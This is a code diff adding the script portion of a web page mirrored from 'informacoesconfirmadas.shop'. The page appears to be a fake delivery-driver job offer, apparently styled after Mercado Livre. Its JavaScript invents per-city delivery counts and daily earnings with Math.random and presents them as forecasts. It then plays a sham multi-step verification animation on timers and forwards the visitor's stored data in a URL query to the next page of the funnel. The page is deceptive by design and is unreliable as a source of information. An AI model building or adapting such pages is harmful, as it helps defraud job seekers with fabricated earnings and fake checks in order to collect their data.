+            const totalEntregas = document.getElementById('totalEntregas');
+            const totalValor = document.getElementById('totalValor');
+
+            if (cidadesSelecionadas.length === 0) {
+                previsaoContainer.classList.remove('active');
+                return;
+            }
+
+            previsaoContainer.classList.add('active');
+            previsaoLista.innerHTML = '';
+
+            let somaEntregas = 0;
+
+            // Limitar exibição a 10 cidades para não sobrecarregar a UI
+            const cidadesExibir = cidadesSelecionadas.slice(0, 10);
+            const cidadesOcultas = cidadesSelecionadas.length - cidadesExibir.length;
+
+            cidadesExibir.forEach(cidade => {
+                // Gerar número aleatório de entregas (30-50)
+                const entregas = Math.floor(Math.random() * 21) + 30;
+                const valor = entregas * 12;
+                somaEntregas += entregas;
+
+                const item = document.createElement('div');
+                item.className = 'previsao-item';
+                item.innerHTML = `
+                    <p class="previsao-cidade">${cidade}:</p>
+                    <p class="previsao-entregas"><span>${entregas}</span> entregas</p>
+                    <p class="previsao-valor"><span>R$ ${valor.toFixed(2).replace('.', ',')}</span> /dia</p>
+                `;
+                previsaoLista.appendChild(item);
+            });
+
+            // Se houver cidades ocultas, adicionar linha indicando
+            if (cidadesOcultas > 0) {
+                // Calcular entregas para cidades ocultas
+                for (let i = 0; i < cidadesOcultas; i++) {
+                    somaEntregas += Math.floor(Math.random() * 21) + 30;
+                }
+
+                const maisItem = document.createElement('div');
+                maisItem.className = 'previsao-item';
+                maisItem.innerHTML = `
+                    <p class="previsao-cidade" style="color: var(--ml-blue);">+ ${cidadesOcultas} cidades...</p>
+                    <p class="previsao-entregas"></p>
+                    <p class="previsao-valor"></p>
+                `;
+                previsaoLista.appendChild(maisItem);
+            }
+
+            const valorTotal = somaEntregas * 12;
+            totalEntregas.textContent = somaEntregas;
+            totalValor.textContent = `R$ ${valorTotal.toFixed(2).replace('.', ',')}`;
+        }
+
+        // Check if all are selected
+        function checkMarcarTodos() {
+            const totalCidades = cidadesGrid.querySelectorAll('.cidade-item:not(.hidden)').length;
+            const selecionadasVisiveis = cidadesGrid.querySelectorAll('.cidade-item:not(.hidden).selected').length;
+            todasMarcadas = selecionadasVisiveis === totalCidades && totalCidades > 0;
+            
+            if (todasMarcadas) {
+                btnMarcarTodos.textContent = 'Desmarcar Todos';
+                btnMarcarTodos.classList.add('active');
+            } else {
+                btnMarcarTodos.textContent = 'Marcar Todos';
+                btnMarcarTodos.classList.remove('active');
+            }
+        }
+
+        // Marcar/Desmarcar todos (apenas visíveis após busca)
+        btnMarcarTodos.addEventListener('click', () => {
+            const items = cidadesGrid.querySelectorAll('.cidade-item:not(.hidden)');
+            
+            if (todasMarcadas) {
+                // Desmarcar todos visíveis
+                items.forEach(item => {
+                    if (item.classList.contains('selected')) {
+                        item.classList.remove('selected');
+                        cidadesSelecionadas = cidadesSelecionadas.filter(c => c !== item.dataset.cidade);
+                    }
+                });
+            } else {
+                // Marcar todos visíveis
+                items.forEach(item => {
+                    if (!item.classList.contains('selected')) {
+                        item.classList.add('selected');
+                        cidadesSelecionadas.push(item.dataset.cidade);
+                    }
+                });
+            }
+            
+            updateCounter();
+            checkMarcarTodos();
+            atualizarPrevisao();
+        });
+
+        // Prosseguir
+        btnProsseguir.addEventListener('click', () => {
+            if (cidadesSelecionadas.length > 0) {
+                localStorage.setItem('cidadesSelecionadas', JSON.stringify(cidadesSelecionadas));
+                iniciarLoading();
+            }
+        });
+
+        // Loading Process
+        function iniciarLoading() {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            loadingOverlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+
+            const steps = [
+                document.getElementById('loadStep1'),
+                document.getElementById('loadStep2'),
+                document.getElementById('loadStep3'),
+                document.getElementById('loadStep4'),
+                document.getElementById('loadStep5')
+            ];
+
+            const checkIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>`;
+
+            let currentStep = 0;
+
+            function processStep() {
+                if (currentStep < steps.length) {
+                    // Ativar step atual
+                    steps[currentStep].classList.remove('pending');
+                    steps[currentStep].classList.add('active');
+
+                    setTimeout(() => {
+                        // Completar step com check
+                        steps[currentStep].classList.remove('active');
+                        steps[currentStep].classList.add('completed');
+                        steps[currentStep].querySelector('.loading-step-icon').innerHTML = checkIcon;
+                        
+                        currentStep++;
+                        
+                        if (currentStep < steps.length) {
+                            setTimeout(processStep, 200);
+                        } else {
+                            setTimeout(() => {
+                                loadingOverlay.classList.remove('active');
+                                mostrarPopupOportunidade();
+                            }, 500);
+                        }
+                    }, 800);
+                }
+            }
+
+            setTimeout(processStep, 300);
+        }
+
+        // Popup Oportunidade
+        function mostrarPopupOportunidade() {
+            const popup = document.getElementById('popupOportunidade');
+            const optionsContainer = document.getElementById('popupOptions');
+            const btnContinuar = document.getElementById('btnContinuarPopup');
+            
+            // Gerar próximos 3 dias + opção "Outro dia"
+            const diasSemana = ['Domingo', 'Segunda-feira', 'Terça-feira', 'Quarta-feira', 'Quinta-feira', 'Sexta-feira', 'Sábado'];
+            const hoje = new Date();
+            
+            optionsContainer.innerHTML = '';
+            
+            for (let i = 1; i <= 3; i++) {
+                const data = new Date(hoje);
+                data.setDate(hoje.getDate() + i);
+                
+                const diaSemana = diasSemana[data.getDay()];
+                const dia = String(data.getDate()).padStart(2, '0');
+                const mes = String(data.getMonth() + 1).padStart(2, '0');
+                
+                const option = document.createElement('div');
+                option.className = 'popup-option';
+                option.textContent = `${diaSemana} ${dia}/${mes}`;
+                option.addEventListener('click', () => selecionarOpcao(option));
+                optionsContainer.appendChild(option);
+            }
+
+            // Opção "Outro dia"
+            const outroDia = document.createElement('div');
+            outroDia.className = 'popup-option';
+            outroDia.textContent = 'Outro dia';
+            outroDia.addEventListener('click', () => selecionarOpcao(outroDia));
+            optionsContainer.appendChild(outroDia);
+
+            popup.classList.add('active');
+        }
+
+        function selecionarOpcao(element) {
+            document.querySelectorAll('.popup-option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            document.getElementById('btnContinuarPopup').classList.add('enabled');
+        }
+
+        // Continuar do popup - Redireciona para recebor.html
+        document.getElementById('btnContinuarPopup').addEventListener('click', () => {
+            const selecionado = document.querySelector('.popup-option.selected');
+            if (selecionado) {
+                // Salvar dados no localStorage
+                const existingData = JSON.parse(localStorage.getItem('userData') || '{}');
+                
+                const userData = {
+                    ...existingData,
+                    dataInicio: selecionado.textContent,
+                    municipiosSelecionados: cidadesSelecionadas
+                };
+                localStorage.setItem('userData', JSON.stringify(userData));
+                
+                // Montar queryParams com todos os dados
+                const queryParams = new URLSearchParams();
+                Object.keys(userData).forEach(key => {
+                    if (userData[key] !== null && userData[key] !== undefined && typeof userData[key] !== 'object') {
+                        queryParams.set(key, userData[key]);
+                    } else if (Array.isArray(userData[key])) {
+                        queryParams.set(key, userData[key].join(','));
+                    }
+                });
+                
+                window.location.href = 'recebord41d.html?' + queryParams.toString();
+            }
+        });
+
+        // Initialize - Carregar cidades da API do IBGE
+        carregarCidades();
+
+        // Função para remover acentos
+        function removerAcentos(texto) {
+            return texto.normalize('NFD').replace(/[\u0300-\u036f]/g, '');
+        }
+
+        // Search functionality
+        const searchInput = document.getElementById('searchCidade');
+        searchInput.addEventListener('input', (e) => {
+            const termo = removerAcentos(e.target.value.toLowerCase().trim());
+            const items = cidadesGrid.querySelectorAll('.cidade-item');
+            
+            items.forEach(item => {
+                const cidade = removerAcentos(item.dataset.cidade.toLowerCase());
+                if (cidade.includes(termo)) {
+                    item.classList.remove('hidden');
+                } else {
+                    item.classList.add('hidden');
+                }
+            });
+
+            // Atualizar botão marcar todos após busca
+            checkMarcarTodos();
+        });
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"e116d703b7fe40798f27b675a7bf64cb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+<!-- Mirrored from informacoesconfirmadas.shop/municipios.html? by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Mar 2026 21:25:10 GMT -->
+</html>
